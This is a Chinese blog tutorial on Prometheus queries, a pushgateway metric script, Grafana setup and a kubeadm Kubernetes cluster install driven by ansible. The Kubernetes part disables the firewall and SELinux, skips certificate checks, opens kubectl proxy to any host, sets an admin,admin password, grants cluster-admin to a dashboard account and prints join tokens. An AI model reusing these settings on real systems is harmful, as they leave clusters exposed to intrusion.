现在sum函数不光把每一台机器的多个核加在一起了，还把所有的机器CPU也全都加到一起了，变成了服务器集群总CPU平均值了。如何解决。看下一步。 第五步 新的一个函数 by(instance) 这个函数可以把sum加合到一起的数值按照指定的一个方式进行一层拆分 instance代表的是机器名 意思就是说把sum函数中服务器加合的这个糗事再给它强行拆分出来。 1sum(increase(node_cpu_seconds_total{mode=&quot;idle&quot;}[1m])) by(instance) 这下3个问题都解决了。现在把公式写完整 1234567(1-((sum(increase(node_cpu_seconds_total{mode=&quot;idle&quot;}[1m])) by(instance)) /(sum(increase(node_cpu_seconds_total[1m])) by (instance)))) * 100sum(increase(node_cpu_seconds_total{mode=&quot;idle&quot;}[1m])) by(instance) 是空闲CPU时间，1分钟的增量sum(increase(node_cpu_seconds_total[1m])) by(instance) 是全部CPU时间，1分钟的增量。sum(increase(node_cpu_seconds_total{mode=&quot;idle&quot;}[1m])) by(instance) /sum(increase(node_cpu_seconds_total[1m])) by(instance) 这样就得到了空闲CPU的百分比了。 第七步 最后一步用1去减掉整个上面的公式再 *100 这样就得到了我们期望的结果 1(1-((sum(increase(node_cpu_seconds_total{mode=&quot;idle&quot;}[1m])) by(instance)) /(sum(increase(node_cpu_seconds_total[1m])) by (instance)))) * 100 查看其他CPU状态时间的使用率 既然要看每一个单独CPU类型的使用率，那么1-idle的方式就不好用了 12345sum(increase(node_cpu_seconds_total{mode=&quot;user&quot;}[1m])) by(instance) /sum(increase(node_cpu_seconds_total[1m])) by (instance)sum(increase(node_cpu_seconds_total{mode=&quot;system&quot;}[1m])) by(instance) /sum(increase(node_cpu_seconds_total[1m])) by (instance)sum(increase(node_cpu_seconds_total{mode=&quot;iowait&quot;}[1m])) by(instance) /sum(increase(node_cpu_seconds_total[1m])) by (instance) 这样就可以获取每一种CPU状态时间的使用百分比了。 现在发现TOP命令的这一行，我们就能明白是怎么回事了。 prometheus命令行使用扩展1.prometheus命令格式 这次选择一个新的key来做讲解 count_netstat_wait_connections (TCP wait_connect数) 2.rate函数的使用 rate函数可以说是prometheus提供的最重要的函数之一。 rate() rate()函数是专门搭配counter类型数据使用的函数 它的功能是按照设置一个时间段，取counter在这个时间段中的平均每秒的增量 这么说可能还有点抽象，举例说下 12node_network_receive_bytesnode_network_receive_bytes_total 这个例子使用的是node_exporter key node_network_receive_bytes_total rate(node_network_receive_bytes_total[1m]) node_network_raceive_bytes_total本身是一个counter类型，字面意思也很好理解，网络接收字节总数 之前学过对于这种持续增长的counter数据，直接输入key是没有任何意义的 我们必须要以获取单位时间内增量的方式来进行加工才能有意义。 那么，对于counter数据，进行第一步初始化的增量获取加工，通常的使用方法就是直接用reate()包上，(increase(),也是可以的，后面会说到) node_network_receive_bytes_total被rate(.[1m])包上以后，就可以获取到在1分钟时间内，平均每秒钟的增量。 这样一来，数据就变得有意义了。 所以说，以后在使用任何counter数据类型的时候，永远记得，别的先不做，先给它加上一个rate()或者increase() 接下来我们把rate()做的事情，更加细化的来解释下。 比如上面的这个图，网络接收字节数一直不停的累加。 从09:40开始到09:41，比如累积量从746250282到了746251282 一分钟内，增加了1000bytes(假设) 从09:41开始到09:46 比如累积量从746251282到了746256282(假设) 加入rate(.[1m])之后 会把1000bytes除以1m*60秒。=~16bytes 就是这样计算出在1分钟内，平均每秒增加16bytes。 接下来把1m修改为5m 1rate(node_network_receive_bytes_total[5m]) 这样就变成把5分钟内的增量除以5m*60 5分钟内的增量假如是5000，那么除以300以后，也还是约等于16bytes. 感觉好像是一模一样的 那么我们看下输出rate[5] 会发现 图形和上面的1分钟发生了一定的变化。 事实是这样的， 如果我们按照rate(1m)这样来取，那么取1分钟内的增量除以秒数 如果我们按照rate(5m)这样来取，那么是取5分钟内的增量除以秒数 而这种取法，是一种平均的取法，而且是假设的 刚才我们说counter在一分钟 5分钟之内的增量1000和5000其实是一种假设的理想状态， 事实上，在生产环境，网络数据接收量可不是这么平均的。 有可能在第一分钟内增加了1000，到第二分钟就变成增加了2500… 所以 ，rate(1m)这样的取值方法比起rate(5m),因为它取的时间段短，所以，在任何某一瞬间的凸起或者降低在成图的时候，会体现的更细致，更敏感。而 rate(5m)把整个5分钟内的都一起 平均了，那么当发生瞬时凸起的时候，会显得图平缓了一些， 那么放大到rate(20m)会怎么样，结果是会更加平缓 。 平时工作中取1m还是5m，这个取决于我们对于监控数据的敏感程度来挑选。 3.increase函数使用 increase函数其实和raate()的概念及使用方法 非常相似 rate()是取一段时间增量的平均每秒数量 increase()则是取一段时间增量的总量 比如 12345increase(node_network_receive_bytes_total[1m])取的是1分钟内的增量总量和rate(node_network_receive_bytes_total[1m])取的是1分钟内增量除以60秒每秒数量 这两个函数查询数据的曲线走势基本是一样的，但是显示的数量bytes不一样，正好是60倍。 4.sum()函数学习 sum()函数的使用，就是取合， sum会把结果集的输出进行总加合。 比如 1rate(node_network_receive_bytes_total[1m])显示的结果集会包含如下内容。 从标签上可以看出，有很多台服务器都返回了这个监控数据 当我们使用sum()包起来后， 12sum(rate(node_network_receive_bytes_total[1m])) 就变成现在的一条线了 等于是给出了所有机器的每秒请求量， 如果要进行下一层的拆分，需要在sum()的后面加上by(instance)才可以按照机器名拆分出一层来 sum()加合其实还有更多巧妙使用。 sum() by(cluster_name) 如果是by instance那么其实跟不加sum()的输出结果是一样的。 本来rate(node_network_receive_bytes_total[1m])就已经是按照每台机器返回了， 但是如果我们希望按集群总量输出呢，比如 ，我们返回了20台机器的数据， 其中有6台属于web server,10台属于DB server，其他的属于一般server 那么我们这时候sum() by(cluster_name)就可以帮我们实现集群加合并分成三条曲线输出了，顺带一提的是(cluster_name)这个标签，默认node_exporter是没有办法提供的，node_exporter只能按照不同的机器名去划分，如果希望支持cluster_name，我们需要自行定义标签。 目前我们学了rete() increase() sum() by()函数。 其实prometheus还提供了更多的函数让我们调用，只不过更加专业化了， 5.topk()函数的学习 定义：取前几位的最高值 1topk(3,count_netstat_wait_connections) Gauge类型的使用 1topk(3,count_netstat_wait_connections) Counter类型的使用 1topk(3,rate(node_network_receive_bytes_total[20m])) 这个函数还是比较容易理解的，根据给定的数字，取数值最高&gt;=x的数值， 需要注意的是这个函数一般在使用的时候，只适合在console查看，graph的意义不大， topk因为对于每个时间点都只取前三高的数值，那么必然会造成单个机器的采集数据不连贯， 比如：server01在这一分钟的wait_connection数量排在所在机器的前三，到了下一分钟，可能就垫底了，自然曲线就会中断， 实际使用的时候一般用topk()函数进行瞬时报警，而不是为了观察曲线。 6.count()函数的学习 定义：把数值符合条件的输出数目进行加合， 比如，找出当前(或者历史的)当TCP等待数大于200的机器数量 1count(count_netstat_wait_connections&gt;200) 这个函数在实际工作中还是很有用的，一般用它进行一些模糊的监控判断。 比如说 企业中有100台服务器，那么当只有10台服务器CPU高于80%的时候，这个时候不需要报警，但是当符合80%CPU的服务器数量超过30台的时候那么就会触发报警。 其他更多的函数可以在prometheus官方网站继续学习 1https://prometheus.io/docs/prometheus/latest/querying/functions/ pushgateway的使用pushgateway是另一种采用被动推送的方式(而不是exporter主动获取)获取监控数据的prometheus插件， 它是可以单独运行在任何节点上的插件(并不一定要在被监控客户端) 然后通过用户自定义开发脚本 把需要监控的数据，发送给pushgateway,然后pushgateway再把数据推送给prometheus server pushgatway的安装运行和配置。 pushgateway和prometheus和exporter一样 12345678910111213141516https://prometheus.io/download/wget https://github.com/prometheus/pushgateway/releases/download/v1.5.1/pushgateway-1.5.1.linux-amd64.tar.gz上面的报错，可以加参数--no-check-certificatewget https://github.com/prometheus/pushgateway/releases/download/v1.5.1/pushgateway-1.5.1.linux-amd64.tar.gz --no-check-certificate解压tar xzf pushgateway-1.5.1.linux-amd64.tar.gzmv pushgateway-1.5.1.linux-amd64 /usr/local/pushgateway通过后台tmux方式运行。cd /usr/local/pushgateway./pushgateway netstat -putnal |grep pushgateway 默认端口9091 关于pushgateway的配置，主要指的是在prometheus server端的配置 123- job_name: &quot;pushgateway&quot; static_configs: - targets: ['localhost:9091'] 在prometheus.yml配置文件中，单独定义一个job,然后target指向到pushgateway运行所在的机器名和端口， 自定义编写脚本的方法，发送pushgateway采集 pushgateway本身是没有任何抓取监控数据的功能的，它只是被动的等待推送过来，所以需要学习pushgateway编程脚本的写法。 如下是一段生产环境中使用shell编写的pushgateway脚本 用于抓取TCP waiting_connection 瞬时数量 123456789101112131415cat /usr/local/node_exporter/node_exporter_shell.sh #!/bin/bashinstance_name=$(hostname -f | cut -d'.' -f1) #本机机器名，变量用于之后的标签。if [ $instance_name == \"localhost\" ];then #要求机器名不能是localhost,要不然标签就没法区分了。echo \"Must FQDN hostname\"exit 1fi#For waitting connections label=\"count_netstat_wait_connections\" #定一个新的keycount_netstat_wait_connections=$(netstat -an | grep -i wait | wc -l) #定义一个新的值netstat中wait的数量echo \"$label:$count_netstat_wait_connections\"echo \"$label $count_netstat_wait_connections\" | curl --data-binary @- http://localhost:9091/metrics/job/pushgateway/instance/$instance_name #最后把key &amp; value 推送给pushgateway curl –data-binary 将HTTP POST请求中的数据发送给HTTP服务器(pushgateway)，与用户提交html表单时浏览器的行为完全一样。 HTTP POST请求中的数据为纯二进制数据。 脚本最重要的两行 12345678910111213count_netstat_wait_connections=$(netstat -an | grep -i wait | wc -l)后面的linux命令行就简单的获取到了我们需要监控的数据TCP_WAIT数http://prometheus.server.com:9091/metrics/job/pushgateway1/instance/$instance_name最后这里用post方式把key &amp; value推送给pushgateway的url地址。这个URL地址中，分成如下三个部分http://prometheus.server.com:9091/metrics/job/pushgateway1/这里是URL的主locationjob/pushgateway1这里是第二部分，第一个标签：推送到哪一个prometheus定义的job里，instance/$instance_name这里是第二个标签，推送后显示的机器名是什么 通过这样的脚本编程方式。我们可以很快速的自定义我们需要的任何监控数据 这个我们编写的监控bash脚本是一次性执行的 ，需要按照时间段反复执行，需要结合contab了。 这里说一下， crontab默认只能最短一分钟的间隔，如果希望小于一分钟的间隔， 我们使用如下的方法 sleep 10 sleep 20 12* * * * * /usr/local/node_exporter/node_exporter_shell.sh* * * * * sleep 20; /usr/local/node_exporter/node_exporter_shell.sh 之后回到prometheus主界面，尝试输入我们自己定义的new_key 看看结果， key的名字就是这个label=”count_netstat_wait_connections” 其他种类的监控数据都可以使用类似的形式直接写脚本发送，使用python也是很好的方式， 使用pushgateway的优缺点 pushgateway这种自定义的采集方式非常的快速，而且极其灵活，几乎不受到任何约束， 一般情况下，只安装node_exporter和DB_exporter两个，其他种类的监控数据可以使用pushgateway的方法采集。 prometheus结合grafana官方网站 1234567891011121314https://grafana.com/https://grafana.com/grafana/download下载：yum install -y https://dl.grafana.com/enterprise/release/grafana-enterprise-9.4.7-1.x86_64.rpm或者wget https://dl.grafana.com/enterprise/release/grafana-enterprise-9.4.7-1.x86_64.rpmyum install -y grafana-enterprise-9.4.7-1.x86_64.rpm启动systemctl start grafana-server检查grafana是否启动成功，grafana启动时会占用3000端口lsof -i:3000 grafana部署成功时，可以http访问，ip就是grafana服务的服务器host 123登录地址：http://192.168.224.11:3000/账号：admin/admin登陆成功后修改新密码。 grafana 安装成功后，会在/etc/grafana目录生成配置文件grafana.ini 1cd /etc/grafana 1.如果需要开启匿名访问，需要修改如下参数 1234567vim /etc/grafana/grafana.ini# 开启匿名访问enabled = true# 给匿名访问者一个组织org_name = Main Org.#给匿名访问者一个访问权限，Viewer表示浏览权限，Editor编辑权限，Admin管理员权限org_role = Viewer 2.如果需要开放浏览器iframe嵌套grafana页面设置，需修改如下参数 123 vim /etc/grafana/grafana.ini# 允许浏览器渲染grafana到iframeallow_embedding = true 修改了配置之后需要重启grafana 1systemctl restart grafana-server 3.隐藏grafana左侧菜单和顶部面包屑 只要在url后面追加 &amp;kiosk 参数 1示例：http://192.168.224.11:3000/?orgId=1&amp;kiosk 添加数据源 主题设置 部署成功后默认只有dark和light两种主题，light白色主题比较刺眼，dark主题看久了有视觉疲劳，grafana可以支持自定义主题设置 1234安装插件grafana-cli plugins install yesoreyeram-boomtheme-panelsystemctl restart grafana-server 2.检查插件是否安装成功 下载主题样式css文件到grafana指定目录 1推荐grafana主题样式gitub地址：https://github.com/gilbN/theme.park 1.创建存放css样式的目录 1234567891011grafana部署成功后，会自动创建/usr/share/grafana目录，这些是存放静态资源的cd /usr/share/grafana/publicmkdir csscd cssmkdir theme-optionspwd/usr/share/grafana/public/css/usr/share/grafana/public/css目录作为存放基础css的目录/usr/share/grafana/public/css/theme-options是存放主题样式的目录 2.在上述github上找到grafana-base.css和transparent.css 说明： grafana-base.css文件在css/base/grafana目录下 transparent.css文件在css/defaults目录下 3.将上述两个文件下载到/usr/share/grafana/public/css目录下 12 4.在grafana-base.css文件引入transparent.css文件 编辑grafana-base.css，在文件顶部添加@import url(“transparent.css”);,以相对路径引入transparent.css 5.下载主题样式文件 将github上css/theme-options中所有css文件下载到/usr/share/grafana/public/css/theme-options目录 6.为样式css文件引入grafana-base.css theme-options目录中所有的css文件头部添加@import url(“../grafana-base.css”);,以相对路径引入grafana-base.css 1@import url(“../grafana-base.css”); 然后重启grafana 启用主题 登录grafana &gt; + &gt; dashboard 创建panel panel &gt; visualization &gt; boom panel &gt; themes &gt; Add New Theme 主题参数 12http://192.168.224.11:3000/public/css/theme-options/aquamarine.css 设置默认主题 dashboard模板导入对于常用的服务监控，例如主机节点监控，elasticsearch等等常见的服务，grafana官方有已经建好的dashboard面板模板，只要去grafana官网导入模板即可。 1常用dashboard模板地址： https://grafana.com/grafana/dashboards/ 例如：要为prometheus监控elasticsearch导入一个dashboard模板 12模板搜索datasource 选择prometheus Copy模板id 注意：你要导入的dashboard模板要与自己安装的elasticsearch_exporter插件要匹配，不然数据可能不会展示 1234567891011121314151617181920下载地址wget https://github.com/prometheus-community/elasticsearch_exporter/releases/download/v1.5.0/elasticsearch_exporter-1.5.0.linux-amd64.tar.gz加入后台启动，vim /etc/systemd/system/elasticsearch_exporter.service [Unit]Description=elasticsearch_exporterAfter=syslog.target network.target[Service]Type=simpleRemainAfterExit=noWorkingDirectory=/usr/local/elasticsearch_exporter/User=rootGroup=rootExecStart=/usr/local/elasticsearch_exporter/elasticsearch_exporter --es.all --es.indices --es.cluster_settings --es.node=&quot;daily_test&quot; --es.indices_settings --es.shards --es.snapshots --es.timeout=5s --web.listen-address &quot;:9114&quot; --web.telemetry-path &quot;/metrics&quot; --es.ssl-skip-verify --es.clusterinfo.interval=5m --es.uri http://localhost:9200Restart=alwaysRestartSec=5[Install]WantedBy=multi-user.target 16483 粘贴模板id到load栏 同样可以添加其他node_exporter模板 123ID是： 1860nginx监控的模板ID 9614 pagerduty的使用pagerduty 注册新账号(免费试用14天) 1234https://signup.pagerduty.com/accounts/new参考步骤，现在需要企业邮箱账号才可以注册https://help.aliyun.com/document_detail/266641.html 创建New Service之后把new service’s interation key 复制到grafana平台notification_channel中，就完成了grafana+pagerduty的连接。 然后设置一下pagerduty给用户发送报警信息 回到Pagerduty的主页面，找到设置里的users选项卡。 然后点击个人信息，进行相关设置 之后就可以正式开始使用了， 在企业中使用的时候，把所有需要接收报警信息的员工手机号，邮箱地址同时都设置上，这样一来，每一次发送报警，所有被加入的员工就都会收到了。","link":"/2023/04/28/Prometheus%E6%90%AD%E5%BB%BA%E9%83%A8%E7%BD%B2/"},{"title":"kubernetes搭建","text":"k8s搭建生产环境都是二进制安装（预编译安装） 12k8s官网地址https://kubernetes.io/docs/tasks/tools/install-kubectl/ yum无法自定义安装 编译安装可以自定义安装 预编译介于两者之间 准备三台服务器： 1、一台master 配置： IP：192.168.224.10 ，2H2G 2、两台node 配置： IP：192.168.224.11，192.168.224.12 ， 1H2G 一、系统规划 主机名 IP 组件 k8smaster 192.168.224.10 etcd、kube-apiserver、kube-controller-manager、kube-scheduler k8snode1 192.168.224.11 kubelet、kube-proxy、docker、dns、calico k8snode2 192.168.224.12 kubelet、kube-proxy、docker、dns、calico 二、初始化系统基础环境系统初始化时由于3台机器大部分操作都相同，我这里在配置过程中，在一台主机上进行配置文件创建，然后使用ansible进行分发，当然你也可以直接在对应主机上进行操作。 1.设置主机名 在三台机器分别执行对应设置主机名的命令 123hostnamectl set-hostname --static k8smasterhostnamectl set-hostname --static k8snode1hostnamectl set-hostname --static k8snode2 2.配置免密钥登陆 以k8smaster为主机，对另外3台机器进行免密钥登陆 1234ssh-keygen ##一路回车进行公钥私钥创建ssh-copy-id -i ~/.ssh/id_rsa.pub -p 22 root@192.168.224.10ssh-copy-id -i ~/.ssh/id_rsa.pub -p 22 root@192.168.224.11ssh-copy-id -i ~/.ssh/id_rsa.pub -p 22 root@192.168.224.12 3.安装ansible(可以不安装，把生成文件或者命令在各节点执行即可) 这里只需在master节点安装即可，后续一些操作均在此机器上执行，然后把生成的文件分发至对应节点 123[root@k8smaster ~]# yum install -y epel-release[root@k8smaster ~]# yum install ansible -y[root@k8smaster ~]# ansible --version 定义主机组 1vim /etc/ansible/hosts [k8smaster] #master节点服务器组k8smaster会报警告 123456789101112[k8szhu] #master服务器组 组名和下面的名字不要一样。k8smaster ansible_host=192.168.224.10 ansible_ssh_user=root#别名 ip 用户[k8snode] #node节点服务器组 k8snode1 ansible_host=192.168.224.11 ansible_ssh_user=rootk8snode2 ansible_host=192.168.224.12 ansible_ssh_user=root[k8sall] #k8s集群服务器组k8smaster ansible_host=192.168.224.10 ansible_ssh_user=rootk8snode1 ansible_host=192.168.224.11 ansible_ssh_user=rootk8snode2 ansible_host=192.168.224.12 ansible_ssh_user=root 测试ansible通讯是否正常 1ansible k8sall -m ping #测试ansible是否正常 4.关闭防火墙、selinux(3台机器都执行，我这里使用ansible) 1234567[root@k8s_masker ~]# ansible k8sall -m shell -a 'systemctl stop firewalld'[root@k8s_masker ~]# ansible k8sall -m shell -a 'systemctl disable firewalld'下面关闭selinux 如果之前设置好了就不用了[root@k8s_masker ~]# ansible k8sall -m shell -a 'setenforce 0' [root@k8s_masker ~]# ansible k8sall -m replace -a 'path=/etc/selinux/config regexp=&quot;SELINUX=enforcing&quot; replace=SELINUX=disabled'[root@k8s_masker ~]# ansible k8sall -m replace -a 'path=/etc/sysconfig/selinux regexp=&quot;SELINUX=enforcing&quot; replace=SELINUX=disabled' 5.配置host主机域名解析 vim /etc/hosts 12345127.0.0.1 localhost localhost.localdomain localhost4 localhost4.localdomain4::1 localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.224.10 k8smaster192.168.224.11 k8snode1192.168.224.12 k8snode2 文件分发到各节点 1ansible k8sall -m copy -a &quot;src=/etc/hosts dest=/etc/hosts&quot; 关闭缓存 12345678ansible k8sall -m shell -a 'swapoff -a '关闭swap分区(不关后面master初始化会失败)临时关闭：swapoff -a永久关闭：注释掉/etc/fstab文件中的swap行ansible k8sall -m shell -a 'free -h' (确认关闭缓存) 6.设置内核 123456将桥接的IPv4流量传递到iptables的链[root@k8smaster ~]# vim /etc/sysctl.d/k8s.confnet.ipv4.ip_forward = 1net.bridge.bridge-nf-call-ip6tables = 1net.bridge.bridge-nf-call-iptables = 1 文件分发 12345ansible k8sall -m copy -a &quot;src=/etc/sysctl.d/k8s.conf dest=/etc/sysctl.d/k8s.conf&quot;开机自动加载模块ansible k8sall -m shell -a 'modprobe br_netfilter'ansible k8sall -m shell -a 'sysctl -p /etc/sysctl.d/k8s.conf' 7.时间同步 1234567设置时区。sudo timedatectl set-timezone 'Asia/Shanghai'ansible k8sall -m shell -a 'sudo timedatectl set-timezone &quot;Asia/Shanghai&quot;'ansible k8sall -m yum -a &quot;name=ntpdate state=latest&quot;ansible k8sall -m cron -a &quot;name='k8s cluster crontab' minute=*/30 hour=* day=* month=* weekday=* job='ntpdate time7.aliyun.com &gt;/dev/null 2&gt;&amp;1'&quot; 三.安装docker1.移除旧的版本 12345678910111213 sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engineansible卸载其他节点的ansible k8sall -m shell -a 'sudo yum remove docker docker-client docker-client-latest docker-common docker-latest docker-latest-logrotate docker-logrotate docker-selinux docker-engine-selinux docker-engine -y ' 2.安装一些必要的系统依赖工具： 123yum install -y yum-utils device-mapper-persistent-data lvm2ansible k8sall -m shell -a 'yum install -y yum-utils device-mapper-persistent-data lvm2' 3.添加软件源信息 1234567ansible k8sall -m shell -a 'yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo'更新yum缓存ansible k8sall -m shell -a 'yum makecache fast'列出docker软件版本信息yum list docker-ce --showduplicates | sort -r 4.安装docker的指定版本 12看哪个版本和k8s没有冲突就安装哪个(我安装18.06的)ansible k8sall -m shell -a 'yum install -y docker-ce-18.06.1.ce-3.el7' 5.支持端口转发 12345ansible k8sall -m shell -a 'echo &quot;net.ipv4.ip_forward = 1&quot; &gt;&gt; /etc/sysctl.conf 'ansible k8sall -m shell -a 'sysctl -p'启动dockeransible k8sall -m shell -a 'systemctl enable docker &amp;&amp; systemctl start docker' 6.docker命令tab自动补全 123456789101112131415161718ansible k8sall -m shell -a 'yum install -y bash-completion'ansible k8sall -m shell -a 'source /usr/share/bash-completion/completions/docker'ansible k8sall -m shell -a 'source /usr/share/bash-completion/bash_completion'配置阿里源加速vim /etc/docker/daemon.json{ &quot;registry-mirrors&quot;: [&quot;https://b9pmyelo.mirror.aliyuncs.com&quot;], &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;]}文件分发ansible k8sall -m copy -a &quot;src=/etc/docker/daemon.json dest=/etc/docker/daemon.json&quot;ansible k8sall -m shell -a 'systemctl restart docker'docker info 四.部署Kubernetes1.k8s的基础配置1.配置k8s源 123456789vim /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/enabled=1gpgcheck=1repo_gpgcheck=1gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg 文件分发 123ansible k8sall -m copy -a 'src=/etc/yum.repos.d/kubernetes.repo dest=/etc/yum.repos.d/kubernetes.repo'ansible k8sall -m shell -a 'yum makecache fast -y ' 2.安装kubeadm，kubelet和kubectl 1234567查看各自的版本号yum list --showduplicates |grep '^kube'由于版本更新频繁，这里指定版本号部署： yum install -y kubelet-1.18.4 kubeadm-1.18.4 kubectl-1.18.4 ansible k8sall -m shell -a ' yum install -y kubelet-1.18.4 kubeadm-1.18.4 kubectl-1.18.4 ' 重新加载守护进程和启动docker kubelet 1234ansible k8sall -m shell -a 'systemctl daemon-reload'ansible k8sall -m shell -a 'systemctl enable docker kubelet'ansible k8sall -m shell -a 'systemctl restart docker kubelet' 2.1.kubectl 命令tab键补全 123456789101112131415yum install -y bash-completionsource /usr/share/bash-completion/bash_completionsource &lt;(kubectl completion bash)echo &quot;source &lt;(kubectl completion bash)&quot; &gt;&gt; ~/.bashrckubectl describe pod ##可以使用了或者添加命令自动补全：yum install -y bash-completionvim ~/.bashrc添加source &lt;(kubectl completion bash)执行下source ~/.bashrc 3.部署Kubernetes Master 在master主节点执行 先查看版本，然后初始化网络服务 12[root@k8smaster ~]# kubelet --versionKubernetes v1.18.4 1)开始初始化 1234567kubeadm init --apiserver-advertise-address=192.168.224.10 --kubernetes-version=v1.18.4 --pod-network-cidr=10.244.0.0/16--apiserver-advertise-address=192.168.224.10 #master组件监听的api地址，这里写masterIP地址即可或者多网卡选择另一个IP地址#自定义镜像源防止超时，kubeadm init --apiserver-advertise-address=192.168.224.10 --image-repository=registry.aliyuncs.com/google_containers --pod-network-cidr=10.244.0.0/16 --kubernetes-version=v1.18.4 按提示创建文件，需要记住两行重要信息 12345kubeadm join 192.168.224.10:6443 --token 23ydjv.e7065vwoee1cr6xf \\ --discovery-token-ca-cert-hash sha256:9eab18f17699039d57a12fd1552a63b686f893562cae6447cbda862e09827175 kubeadm join 192.168.224.10:6443 --token mzm37i.f5hiuopkjty4l19j \\ --discovery-token-ca-cert-hash sha256:2ad0382860c95928cd058740d7f76ee0a28eb8a4ab318edf8ac9a687d7e818d8 以上为kubeadm初始化命令的输出信息，记录输出结果的最后2行。这2行为在集群成员上执行的命令，用于将成员加入集群中。 配置常规用户如何使用kubectl访问集群 12345把/etc/kubernetes/admin.conf 复制到当前登录用户下./kube/config 文件中.并修改权限为当前用户mkdir -p $HOME/.kubecp -i /etc/kubernetes/admin.conf $HOME/.kube/configchown $(id -u):$(id -g) $HOME/.kube/config 初始化成功后docker container ls -a 会发现启动了10个容器 同时在/etc/kubernetes/目录 会自动生成相关配置文件 1admin.conf controller-manager.conf kubelet.conf manifests pki scheduler.conf 设置环境变量 123456echo &quot;export KUBECONFIG=/etc/kubernetes/admin.conf&quot; &gt;&gt; ~/.bash_profile source ~/.bash_profile确认版本信息kubectl version 123这时候查看podkubectl get pod -n kube-system -o wide 2)初始化失败解决办法 123456789自动删除相关文件和数据kubeadm reset 所有的都要执行。// 或者手动删除相关文件和images rm -rf /etc/kubernetes/*.conf rm -rf /etc/kubernetes/manifests/*.yaml docker ps -a |awk '{print $1}' |xargs docker rm -f systemctl stop kubelet再次初始化前需要执行清除etcd所有数据的操作 4.master安装Flannel 1234567891011121314151617kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.ymlwget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml #如果安装失败，原因：外网不可访问 尝试以下方法# 在https://www.ipaddress.com/查询raw.githubusercontent.com的真实IP。sudo vim /etc/hosts185.199.108.133 raw.githubusercontent.com#开启IPVS，修改ConfigMap的kube-system/kube-proxy中的模式为ipvskubectl edit cm kube-proxy -n kube-system 修改：mode: &quot;ipvs&quot;重启kube-proxykubectl get pod -n kube-system | grep kube-proxy | awk '{system(&quot;kubectl delete pod &quot;$1&quot; -n kube-system&quot;)}'然后再次部署安装。 查看所有pod 1kubectl get pod -n kube-system -o wide 查看节点 12kubectl get node 目前就只有master的信息 5.加入node节点 ！！！在集群成员节点执行！！！ 执行token命令，参考主节点上执行kubeadm init命令的输出结果。 样例（注意不能复制，一定要复制主节点kubeadm init命令的输出结果的最后2行） 12kubeadm join 192.168.224.10:6443 --token 23ydjv.e7065vwoee1cr6xf \\ --discovery-token-ca-cert-hash sha256:9eab18f17699039d57a12fd1552a63b686f893562cae6447cbda862e09827175 查看所有node节点加入是否成功 在所有node上执行docker ps 查看k8s组件是否已安装 123456docker ps 共有4个k8s_kube-flannel与k8s_kube-proxy POD的 kube-proxy与kube-flannel 在master上操作 确认所有节点都加入到集群中，注意：下面的命令在成员加入后要等一段时间才会生效。最快10秒 1kubectl get nodes 123kubectl get pods -n kube-systemkubectl get pods -n kube-system -o wide 查看详细信息 有12个在运行，新加入了4个 以上信息有k8snode1这个从节点的信息，flannel和proxy都有三个pod 到这里，k8s通过kubeadm搭建集群成功 2.安装控制台仪表盘1.部署官方的 Dashboard 1官方文档是最重要的参考资料：https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/ ！！！在主节点执行！！ 1234wget https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.1/src/deploy/recommended/kubernetes-dashboard.yaml#最新版本kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.7.0/aio/deploy/recommended.yaml 1.修改yaml文件内容 12345678 vim kubernetes-dashboard.yaml把112行的 kubernetes-dashboard 镜像地址修改成阿里云的 在国外可以不修改image: registry.aliyuncs.com/google_container/kubernetes-dashboard-amd64:v1.10.1#这个也行registry.cn-hangzhou.aliyuncs.com/google_containers/kubernetes-dashboard-amd64:v1.8.3在158行新增type: NodePortnodePort: 32666 安装Dashboard 1kubectl apply -f kubernetes-dashboard.yaml 使用master节点ip地址+端口来访问，协议是https的 查看Dashboard端口信息： 1kubectl --namespace=kube-system get service kubernetes-dashboard 以我自己的服务器为访问对象，使用https://192.168.224.10:32666 即可访问 可以执行以下命令 1kubectl proxy --address='0.0.0.0' --accept-hosts='^*$' 这时候就可以通过其它主机访问dashboard了.(以上地址中localhost改为ip地址) 如果没有登陆,则会默认定向到登陆页面,可以使用config或者token方式登陆.我们这里使用token方式登陆. 1http://192.168.224.10:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login 2.如果访问出现被防火墙拦截 vim /etc/systemd/system/multi-user.target.wants/docker.service 12345#在server字段中添加ExecStartPost=/sbin/iptables -I FORWARD -s 0.0.0.0/0 -j ACCEPT#重启docker服务systemctl daemon-reloadsystemctl restart docker 3.创建账号密码文件(这步可以忽略) 123 cat &lt;&lt;EOF &gt; /etc/kubernetes/pki/basic_auth_fileadmin,admin,2EOF 配置密码文件 12345vim /etc/kubernetes/manifests/kube-apiserver.yaml新增一行信息- --basic_auth_file=/etc/kubernetes/pki/basic_auth_file--service-node-port-range=2-65535 #这行表示端口映射范围，默认是(30000-32767) 重新启动kubelet服务，使密码配置生效 123systemctl restart kubelet实测新增上面的信息后，重启会出错 应用API服务器配置 12cd /etc/kubernetes/manifests[root@k8smaster manifests]# kubectl apply -f kube-apiserver.yaml 配置Dashboard 12345kubectl get clusterrole/cluster-admin -o yamlkubectl create clusterrolebinding login-on-dashboard-with-cluster-admin --clusterrole=cluster-admin --user=adminkubectl get clusterrolebinding/login-on-dashboard-with-cluster-admin -o yaml 4.登录web页面 用火狐浏览器 1https://192.168.224.10:32666 登陆方式分为俩种： 1.kubeconfig 2.token 在master上执行 123456789创建一个dashboard管理用户kubectl create serviceaccount dashboard-admin -n kube-system绑定用户为集群管理用户kubectl create clusterrolebinding dashboard-admin --clusterrole=cluster-admin 